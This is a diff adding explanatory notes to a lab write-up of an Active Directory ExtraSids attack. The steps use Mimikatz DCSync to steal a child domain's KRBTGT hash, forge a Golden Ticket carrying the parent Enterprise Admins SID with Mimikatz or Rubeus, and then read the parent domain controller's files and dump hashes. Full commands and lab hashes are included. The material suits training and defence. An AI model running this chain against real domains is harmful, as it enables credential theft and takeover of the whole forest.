@@ -32,18 +32,19 @@ type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
 # Alternative — Rubeus (outputs base64 ticket + injects with /ptt)
 .\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_SID> /sids:<EA_SID> /user:hacker /ptt
 ```
+> Full ExtraSids attack chain from Windows. Collect four values: child domain SID, child domain KRBTGT hash, parent Enterprise Admins SID, and a fake username. `/ptt` injects the forged ticket immediately so you do not need to import it separately.
 
 ---
 
 ## What is the ExtraSids Attack?
 
-**The concept:** Within the same AD forest, SID Filtering is disabled by default. SID History is a legitimate migration feature — when a user moves from one domain to another, their old SID is added to the `sidHistory` attribute so they keep access to old resources.
+**The concept:** Inside an Active Directory (AD) forest, Security Identifier (SID) Filtering is turned off by default. SID History is a real migration feature. When a user moves from one domain to another, their old SID is stored in the `sidHistory` attribute so they keep access to old resources.
 
-**The abuse:** If we compromise a child domain, we can forge a Golden Ticket (fake TGT) for the child domain with an extra SID in the ticket — specifically the SID of the **Enterprise Admins** group from the parent domain. When we authenticate anywhere in the forest using this ticket, the parent domain's DC sees the Enterprise Admin SID in our token and treats us as a member of that group.
+**The abuse:** If you compromise a child domain, you can forge a Golden Ticket (a fake Ticket Granting Ticket, or TGT) for that child domain. You inject an extra SID into the ticket — the SID of the **Enterprise Admins** group in the parent domain. When you use this ticket anywhere in the forest, the parent DC sees the Enterprise Admin SID and treats you as a member of that group.
 
-**Why it works:** SID Filtering (which would block this) is only enforced across **forest boundaries**, not within a forest. Parent-child trusts inside the same forest don't filter SIDs — this is by design. The fix would be to enable Selective Authentication, but almost no one does.
+**Why it works:** SID Filtering only applies across **forest boundaries**. Trusts inside the same forest do not filter SIDs — that is by design. Selective Authentication would fix this, but almost no one enables it.
 
-**Result:** Full Enterprise Admin access to the parent domain from a child domain compromise — one step up the chain to total forest control.
+**Result:** Full Enterprise Admin access to the parent domain from a child domain compromise. One step up gives you total forest control.
 
 ---
 
@@ -69,6 +70,7 @@ ls \\academy-ea-dc01.inlanefreight.local\c$
 # This confirms we are currently a child domain user with no parent domain rights
 # We run this before and after the attack to prove the escalation worked
 ```
+> Baseline check — confirms you cannot reach the parent DC's C: drive before the attack. Run this same command again after forging the ticket to prove the escalation worked.
 
 ### Step 2 — Get the child domain SID
 
@@ -77,6 +79,7 @@ cd C:\Tools
 Import-Module .\PowerView.ps1
 # Load PowerView so Get-DomainSID is available
 ```
+> Loads PowerView so `Get-DomainSID` is available.
 
 ```powershell
 Get-DomainSID
@@ -85,6 +88,7 @@ Get-DomainSID
 # Lab result: S-1-5-21-2806153819-209893948-922872689
 # Note: the child domain SID is also visible in Mimikatz dcsync output (Object Security ID line)
 ```
+> Gets the SID of the current domain. This is the child domain SID needed for the Golden Ticket. You can also find it in Mimikatz output on the "Object Security ID" line during a DCSync.
 
 ### Step 3 — DCSync the KRBTGT hash from the child domain
 
@@ -93,12 +97,14 @@ cd C:\Tools\mimikatz\x64
 .\mimikatz.exe
 # Navigate to the x64 version — the Win32 version will fail on 64-bit systems
 ```
+> Launches the 64-bit version of Mimikatz. The 32-bit version fails on 64-bit Windows. Always use the x64 build.
 
 ```
 privilege::debug
 # Request SeDebugPrivilege — required before any lsadump command
 # Without this, Mimikatz cannot access LSASS memory or perform DCSync
 ```
+> Grants Mimikatz the debug privilege needed to access protected memory and perform DCSync. Run this before any `lsadump` command.
 
 ```
 lsadump::dcsync /user:LOGISTICS\krbtgt
@@ -109,6 +115,7 @@ lsadump::dcsync /user:LOGISTICS\krbtgt
 # Look for: "Hash NTLM: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" under Credentials
 # Lab result: 9d765b482771505cbe97411065964d5f
 ```
+> Extracts the KRBTGT account's NTLM hash from the child domain. This hash is the signing key for all Kerberos tickets in the child domain. Copy the value next to "Hash NTLM:" — it is used in the next step.
 
 ### Step 4 — Get the Enterprise Admins SID from the parent domain
 
@@ -123,12 +130,14 @@ Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | sele
 # Lab result: S-1-5-21-3842939050-3880317879-2865463114-519
 # The -519 RID at the end is always the Enterprise Admins group — consistent across all domains
 ```
+> Gets the Enterprise Admins group SID from the parent domain. The relative identifier (RID) is always `-519`. The prefix (before `-519`) is the parent domain's SID. Replace the domain name with your parent domain.
 
 ### Step 5 — Forge the Golden Ticket with ExtraSids (Mimikatz)
 
 ```
 kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
 ```
+> Forges a Golden Ticket with the Enterprise Admins SID injected as an extra SID. `/sids:` is the critical parameter — it injects the parent domain's Enterprise Admins group into the ticket's PAC so the parent DC treats you as an Enterprise Admin. `/ptt` injects the ticket into the current session.
 
 Each parameter explained:
 ```
@@ -170,6 +179,7 @@ klist
 # Cache Flags: 0x1 -> PRIMARY = this is an active TGT, not just a service ticket
 # Renew Time 10 years out = Golden Ticket (real tickets expire in ~10 hours)
 ```
+> Verifies the forged ticket is active. Look for `Cache Flags: 0x1 -> PRIMARY` which means a TGT (Ticket Granting Ticket), and a 10-year renew time which is the signature of a Golden Ticket.
 
 ### Step 7 — Access parent domain and read flag
 
@@ -179,6 +189,7 @@ ls \\academy-ea-dc01.inlanefreight.local\c$
 # If the ExtraSids attack worked, this will now list the DC's filesystem
 # Previously got "Access is denied" — now we're in as Enterprise Admin
 ```
+> Confirms access to the parent DC's file system. This was "Access is denied" before the attack. If the directory listing now shows, the ExtraSids ticket is working.
 
 ```powershell
 type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
@@ -186,6 +197,7 @@ type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
 # Full UNC path required — no cd across SMB shares in this context
 # Lab result: f@ll1ng_l1k3_d0m1no3$
 ```
+> Reads a file on the parent DC using the forged ticket. Use the full Universal Naming Convention (UNC) path — you cannot `cd` into an SMB share. Replace the path for your target.
 
 ---
 
@@ -198,6 +210,7 @@ type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
 # /ptt = inject ticket into memory (same as Mimikatz)
 # Rubeus also outputs a base64-encoded .kirbi blob — save it if you need to use the ticket elsewhere
 ```
+> Rubeus alternative for forging the ExtraSids Golden Ticket. `/rc4` is the same KRBTGT hash (Rubeus uses `/rc4` while Mimikatz uses `/krbtgt`). Rubeus also outputs a base64 `.kirbi` blob you can save and reuse.
 
 After Rubeus injection, use the same `klist` → `ls \\DC\c$` verification steps.
 
@@ -214,6 +227,7 @@ lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 # Without /domain, Mimikatz will try to DCSync from your local domain's DC and fail
 # Lab result: lab_adm NT hash = 663715a1a8b957e8e9943cc98ea451b6
 ```
+> DCSync a user from the parent domain after the ticket is injected. `/domain:` is required here — without it Mimikatz targets your current (child) domain's DC and fails. Replace `lab_adm` with `administrator` or `krbtgt` for the highest-value hashes.
 
 ---
 
